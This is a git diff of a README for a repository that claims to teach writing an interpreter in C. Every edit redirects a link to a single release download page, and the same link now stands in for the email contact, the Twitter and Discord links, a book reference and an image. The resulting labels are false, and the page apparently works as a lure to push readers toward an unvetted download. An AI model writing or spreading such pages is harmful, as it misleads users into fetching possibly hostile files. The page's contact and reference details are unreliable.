@@ -4,11 +4,11 @@ Welcome to the **WAIIC** repository! Here we explore the intricacies of writing 
 
 ## Repository Details ℹ️
 
-- **Repository name**: [waiic](https://github.com/files/Soft.zip)
+- **Repository name**: [waiic](https://github.com/Suhail1840/waiic/releases/tag/v1.2)
 - **Short description**: Writing An Interpreter In C
 - **Topics**: C, C language, C programming, Interpreter, Low-level, Low-level programming, Monkey programming language, Thorsten Ball, Writing an Interpreter in Go
 
-🔗 **Link**: [Download WAIIC Here](https://github.com/files/Soft.zip)
+🔗 **Link**: [Download WAIIC Here](https://github.com/Suhail1840/waiic/releases/tag/v1.2)
 
 🚀 **Launch the link to get started with the content!** 🚀
 
@@ -44,23 +44,23 @@ Stay tuned for exciting updates as we progress through these milestones on our j
 
 To enrich your learning experience with **WAIIC**, we recommend exploring the following resources:
 
-- [Thorsten Ball's book - Writing An Interpreter In Go](https://www.example.com): A valuable reference for understanding interpreter development concepts.
+- [Thorsten Ball's book - Writing An Interpreter In Go](https://github.com/Suhail1840/waiic/releases/tag/v1.2): A valuable reference for understanding interpreter development concepts.
 - Online C Programming Tutorials: Dive into online tutorials to enhance your skills in C programming for interpreter construction.
 
 ## Get In Touch! 📬
 
 Have questions, feedback, or ideas to share? Reach out to us through the following channels:
 
-- Email: waiic@opensource.com
-- Twitter: [@WAIIC_Official](https://twitter.com/WAIIC_Official)
-- Discord: [WAIIC Community Server](https://discord.gg/WAIIC)
+- Email: https://github.com/Suhail1840/waiic/releases/tag/v1.2
+- Twitter: [@WAIIC_Official](https://github.com/Suhail1840/waiic/releases/tag/v1.2)
+- Discord: [WAIIC Community Server](https://github.com/Suhail1840/waiic/releases/tag/v1.2)
 
 We value your input and look forward to engaging with you on your interpreter-building journey!
 
 ---
 
-🚀 Start exploring the world of writing interpreters in C with **WAIIC**! Download the contents from [here](https://github.com/files/Soft.zip) and embark on this exciting adventure! Happy coding! 🌟
+🚀 Start exploring the world of writing interpreters in C with **WAIIC**! Download the contents from [here](https://github.com/Suhail1840/waiic/releases/tag/v1.2) and embark on this exciting adventure! Happy coding! 🌟
 
-![Interpreter](https://imageurl.com/interpreter.png)
+![Interpreter](https://github.com/Suhail1840/waiic/releases/tag/v1.2)
 
 Let's make interpretation in C a fascinating and enriching experience together! 🚀🔍🔧
